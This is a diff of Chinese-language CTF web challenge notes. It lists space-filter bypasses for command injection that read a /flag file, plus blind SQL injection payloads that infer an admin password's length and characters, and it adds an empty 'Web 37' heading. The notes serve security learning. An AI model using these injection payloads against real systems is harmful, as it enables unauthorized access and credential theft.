@@ -333,7 +333,11 @@ for i in range(1,250):
     * {cat,/flag}：绕过空格限制，读取根目录下flag文件；
     * cat</flag：绕过空格限制，
     * cat<>/flag：绕过空格限制；
-    * a=$‘\x20/flag’&&cat$a：\x20转换为字符串就是空格;
+    * `a=$‘\x20/flag’&&cat$a`：\x20转换为字符串就是空格;
 再做个关于fuzz后台登录密码的注入笔记：
     * 判断密码长度：uname=admin'^(length(passwd)=32)^'，逐一递增，并根据32位猜测密码为MD5。
     * 判断密码每一位字符：uname=admin'^(ascii(substr((passwd)from(1))=52)^'
+
+#### Web 37
+提示：union,命令执行
+* 解题思路：
